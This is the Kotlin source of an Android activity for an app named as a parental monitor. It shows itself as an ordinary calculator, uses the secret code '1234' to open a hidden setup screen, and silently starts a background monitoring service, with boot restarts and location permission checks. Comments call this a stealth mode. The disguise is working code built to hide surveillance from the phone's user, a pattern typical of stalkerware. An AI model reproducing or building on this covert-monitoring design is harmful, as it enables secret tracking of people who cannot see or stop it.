package com.redeye.parentalmonitor.ui

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.redeye.parentalmonitor.R
import com.redeye.parentalmonitor.data.PreferencesManager
import com.redeye.parentalmonitor.service.MonitoringService
import com.redeye.parentalmonitor.utils.CalculatorFormat
import com.redeye.parentalmonitor.utils.MessageScheduler
import com.redeye.parentalmonitor.BuildConfig
import com.redeye.parentalmonitor.utils.ServiceStart

class MainActivity : AppCompatActivity() {

    private lateinit var preferencesManager: PreferencesManager

    override fun onSaveInstanceState(outState: Bundle) {
        super.onSaveInstanceState(outState)
        outState.putString("currentNumber", currentNumber)
        outState.putString("previousNumber", previousNumber)
        outState.putString("operator", operator)
        outState.putString("lastExpression", lastExpression)
        outState.putBoolean("justCalculated", justCalculated)
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "MainActivity onCreate")

        setContentView(R.layout.activity_calculator)
        supportActionBar?.hide()
        try {
            window.statusBarColor = getColor(R.color.calc_background)
            window.navigationBarColor = getColor(R.color.calc_background)
            val controller = androidx.core.view.WindowCompat.getInsetsController(window, window.decorView)
            controller.isAppearanceLightStatusBars = true
            controller.isAppearanceLightNavigationBars = true
        } catch (_: Exception) {
        }
        initCalculator()
        if (savedInstanceState != null) {
            currentNumber = savedInstanceState.getString("currentNumber", "")
            previousNumber = savedInstanceState.getString("previousNumber", "")
            operator = savedInstanceState.getString("operator", "")
            lastExpression = savedInstanceState.getString("lastExpression", "")
            justCalculated = savedInstanceState.getBoolean("justCalculated", false)
            updateCalculatorDisplay()
        }
        val appCtx = applicationContext
        try {
            com.redeye.parentalmonitor.utils.Background.runCritical {
                try {
                    PreferencesManager.refreshInstance(appCtx)
                } catch (_: Exception) {
                }
                try {
                    preferencesManager = PreferencesManager.getInstance(appCtx)
                } catch (_: Exception) {
                }
                try {
                    startMonitoringInBackground()
                } catch (_: Exception) {
                }
            }
        } catch (_: Exception) {
        }
    }

    override fun onResume() {
        super.onResume()
        refreshForegroundTypes()
    }

    private fun refreshForegroundTypes() {
        try {
            if (!MonitoringService.isRunning) return
            val intent = Intent(this, MonitoringService::class.java).apply {
                action = MonitoringService.ACTION_REFRESH_FGS
            }
            ServiceStart.startForeground(this, intent)
        } catch (_: Exception) {
        }
    }

    // ═══════════════════════════════════════════════════════════
    // CALCULATOR FUNCTIONS (RELEASE MODE - STEALTH)
    // ═══════════════════════════════════════════════════════════

    private var calculatorDisplay: android.widget.TextView? = null
    private var calculatorHistory: android.widget.TextView? = null
    private var currentNumber = ""
    private var operator = ""
    private var previousNumber = ""
    private var lastExpression = ""
    private var justCalculated = false

    private fun initCalculator() {
        if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Initializing Calculator UI")
        calculatorDisplay = findViewById(R.id.calculatorDisplay)
        calculatorHistory = findViewById(R.id.calculatorHistory)
        calculatorDisplay?.let {
            try {
                androidx.core.widget.TextViewCompat.setAutoSizeTextTypeUniformWithConfiguration(
                    it, 28, 64, 2, android.util.TypedValue.COMPLEX_UNIT_SP
                )
            } catch (_: Exception) {
            }
        }

        // Number buttons
        val digitViews = listOf(R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4, R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9)
        digitViews.forEachIndexed { index, viewId ->
            findViewById<android.widget.Button>(viewId)?.setOnClickListener { appendNumber(index.toString()) }
        }
        findViewById<android.widget.Button>(R.id.btnDot)?.setOnClickListener { appendNumber(".") }

        // Operator buttons
        findViewById<android.widget.Button>(R.id.btnPlus)?.setOnClickListener { setOperator("+") }
        findViewById<android.widget.Button>(R.id.btnMinus)?.setOnClickListener { setOperator("−") }
        findViewById<android.widget.Button>(R.id.btnMultiply)?.setOnClickListener { setOperator("×") }
        findViewById<android.widget.Button>(R.id.btnDivide)?.setOnClickListener { setOperator("÷") }

        // Function buttons
        findViewById<android.widget.Button>(R.id.btnEquals)?.setOnClickListener { calculate() }
        findViewById<android.widget.Button>(R.id.btnClear)?.setOnClickListener { clear() }
        findViewById<android.widget.Button>(R.id.btnToggleSign)?.setOnClickListener { toggleSign() }
        findViewById<android.widget.Button>(R.id.btnPercent)?.setOnClickListener { percent() }

        if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Calculator initialized")
    }

    private fun appendNumber(number: String) {
        if (justCalculated) {
            currentNumber = ""
            previousNumber = ""
            operator = ""
            lastExpression = ""
            justCalculated = false
        }
        if (currentNumber == "Error") {
            currentNumber = ""
            previousNumber = ""
            operator = ""
            lastExpression = ""
        }
        if (number == ".") {
            if (currentNumber.contains(".")) return
            when {
                currentNumber.isEmpty() -> currentNumber = "0."
                currentNumber == "-" -> currentNumber = "-0."
                else -> currentNumber += "."
            }
        } else if (currentNumber == "0") {
            currentNumber = number
        } else if (currentNumber == "-0") {
            currentNumber = "-$number"
        } else {
            if (currentNumber.count { it.isDigit() } >= 12) return
            currentNumber += number
        }

        updateCalculatorDisplay()
    }

    private fun setOperator(op: String) {
        justCalculated = false
        if (currentNumber == "Error") {
            clear()
            return
        }
        if (currentNumber.isEmpty() || currentNumber == "-") {
            if (previousNumber.isNotEmpty()) {
                operator = op
                updateCalculatorDisplay()
            }
            return
        }
        if (previousNumber.isNotEmpty()) {
            calculate()
            if (currentNumber == "Error" || currentNumber.isEmpty()) return
        }
        operator = op
        previousNumber = currentNumber
        currentNumber = ""
        justCalculated = false
        updateCalculatorDisplay()
    }

    private fun calculate() {
        if (!justCalculated && currentNumber == "1234" && previousNumber.isEmpty() && operator.isEmpty()) {
            if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "SECRET CODE -> open SetupActivity")
            currentNumber = ""
            previousNumber = ""
            operator = ""
            lastExpression = ""
            justCalculated = false
            updateCalculatorDisplay()
            openSetupPage()
            return
        }

        if (previousNumber.isEmpty() || currentNumber.isEmpty() || currentNumber == "-") return

        val currentStr = currentNumber
        val num1 = previousNumber.toDoubleOrNull() ?: return
        val num2 = currentStr.toDoubleOrNull() ?: return

        val result = when (operator) {
            "+" -> num1 + num2
            "−" -> num1 - num2
            "×" -> num1 * num2
            "÷" -> if (num2 != 0.0) num1 / num2 else Double.NaN
            else -> num2
        }

        currentNumber = formatResult(result)

        lastExpression = "$previousNumber $operator $currentStr"
        justCalculated = true
        previousNumber = ""
        operator = ""
        updateCalculatorDisplay()
    }

    private fun formatResult(result: Double): String {
        if (result.isNaN() || result.isInfinite()) return "Error"
        val abs = kotlin.math.abs(result)
        if (result == kotlin.math.floor(result) && abs < if (result < 0) 1e11 else 1e12) {
            return result.toLong().toString()
        }
        val floored = kotlin.math.floor(abs)
        val intDigits = if (floored < 1.0) 1 else java.math.BigDecimal.valueOf(floored).toPlainString().substringBefore('.').trimStart('-').trimStart('0').length.coerceAtLeast(1)
        val signExtra = if (result < 0) 1 else 0
        if (intDigits + signExtra > 12) {
            return String.format(java.util.Locale.US, "%.5E", result)
        }
        val maxScale = (12 - intDigits - signExtra).coerceIn(0, 8)
        val plain = java.math.BigDecimal.valueOf(result)
            .setScale(maxScale, java.math.RoundingMode.HALF_UP)
            .stripTrailingZeros()
            .toPlainString()
        if (result != 0.0 && plain.trimStart('-') == "0") {
            return String.format(java.util.Locale.US, "%.5E", result)
        }
        if (plain.count { it.isDigit() } + (if (plain.startsWith("-")) 1 else 0) > 12) {
            return String.format(java.util.Locale.US, "%.5E", result)
        }
        return plain
    }

    private fun clear() {
        currentNumber = ""
        previousNumber = ""
        operator = ""
        lastExpression = ""
        justCalculated = false
        updateCalculatorDisplay()
    }

    private fun toggleSign() {
        if (currentNumber == "Error") {
            clear()
            return
        }
        if (currentNumber.isEmpty()) {
            if (operator.isNotEmpty()) {
                currentNumber = "-"
                updateCalculatorDisplay()
            }
            return
        }
        currentNumber = when {
            currentNumber == "-" -> ""
            currentNumber.startsWith("-") -> currentNumber.removePrefix("-")
            currentNumber == "0" -> "0"
            else -> "-$currentNumber"
        }
        updateCalculatorDisplay()
    }

    private fun percent() {
        if (currentNumber == "Error") {
            clear()
            return
        }
        if (currentNumber.isEmpty() || currentNumber == "-") return
        val value = currentNumber.toDoubleOrNull() ?: return
        val base = previousNumber.toDoubleOrNull()
        val result = if (operator.isNotEmpty() && base != null) {
            base * value / 100.0
        } else {
            value / 100.0
        }
        currentNumber = formatResult(result)
        lastExpression = ""
        justCalculated = true
        updateCalculatorDisplay()
    }

    private fun updateCalculatorDisplay() {
        calculatorDisplay?.text = when {
            currentNumber.isNotEmpty() -> CalculatorFormat.displayNumber(currentNumber)
            previousNumber.isNotEmpty() -> CalculatorFormat.displayNumber(previousNumber)
            else -> "0"
        }
        calculatorHistory?.text = when {
            justCalculated -> CalculatorFormat.history(lastExpression)
            operator.isNotEmpty() && currentNumber.isNotEmpty() && currentNumber != "-" ->
                "${CalculatorFormat.displayNumber(previousNumber)} $operator ${CalculatorFormat.displayNumber(currentNumber)}"
            operator.isNotEmpty() -> "${CalculatorFormat.displayNumber(previousNumber)} $operator"
            else -> ""
        }
    }

    private fun openSetupPage() {
        try {
            startActivity(Intent(this, SetupActivity::class.java).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
        } catch (e: Exception) {
            if (BuildConfig.DEBUG) android.util.Log.e("MainActivity", "Failed to open setup", e)
            try {
                Toast.makeText(this, getString(R.string.msg_open_setup_failed, e.message ?: ""), Toast.LENGTH_SHORT).show()
            } catch (_: Exception) {
            }
        }
    }

    private fun startMonitoringInBackground() {
        try {
            try {
                preferencesManager = PreferencesManager.getInstance(applicationContext)
            } catch (_: Exception) {
            }
            if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Starting monitoring in background (stealth mode)")
            if (!preferencesManager.isConfigured()) {
                if (BuildConfig.DEBUG) android.util.Log.e("MainActivity", "Not configured - cannot start monitoring")
                try {
                    MessageScheduler.scheduleBootRestart(this)
                } catch (_: Exception) {
                }
                return
            }

        if (!hasAllPermissions()) {
            if (BuildConfig.DEBUG) android.util.Log.w("MainActivity", "Permissions missing - staying silent, grant via Setup")
            try {
                MessageScheduler.scheduleBootRestart(this)
            } catch (_: Exception) {
            }
            return
        }

        // Start monitoring service silently
        if (preferencesManager.userDisabledMonitoring || !preferencesManager.userConsentedMonitoring) {
            if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Monitoring disabled by user - not auto-starting")
            return
        }
        if (!hasBackgroundLocation()) {
            if (BuildConfig.DEBUG) android.util.Log.w("MainActivity", "Background location missing - starting anyway with degraded location, grant via Setup")
        }
        if (!preferencesManager.isMonitoringEnabled || !MonitoringService.isRunning) {
            try {
                startMonitoringService()
                if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "✓ Monitoring started in background!")
            } catch (e: Exception) {
                if (BuildConfig.DEBUG) android.util.Log.e("MainActivity", "✗ Failed to start monitoring: ${e.message}")
                try {
                    MessageScheduler.scheduleBootRestart(this)
                } catch (_: Exception) {
                }
            }
        } else {
            if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Monitoring already running")
        }
        } catch (_: Exception) {
        }
    }

    private fun hasAllPermissions(): Boolean {
        return com.redeye.parentalmonitor.utils.AppPermissions.hasAll(this)
    }

    private fun hasBackgroundLocation(): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return true
        return ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) == PackageManager.PERMISSION_GRANTED
    }

    private fun startMonitoringService() {
        if (BuildConfig.DEBUG) android.util.Log.d("MainActivity", "Creating service intent...")
        val intent = Intent(this, MonitoringService::class.java).apply {
            action = MonitoringService.ACTION_START_MONITORING
        }

        if (BuildConfig.DEBUG) android.util.Log.d("MainActivity", "Starting service...")
        try {
            ServiceStart.startForeground(this, intent)
            if (BuildConfig.DEBUG) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    android.util.Log.i("MainActivity", "Started as foreground service")
                } else {
                    android.util.Log.i("MainActivity", "Started as regular service")
                }
            }
        } catch (e: Exception) {
            if (BuildConfig.DEBUG) android.util.Log.e("MainActivity", "Failed to start service", e)
            throw e
        }
    }

}
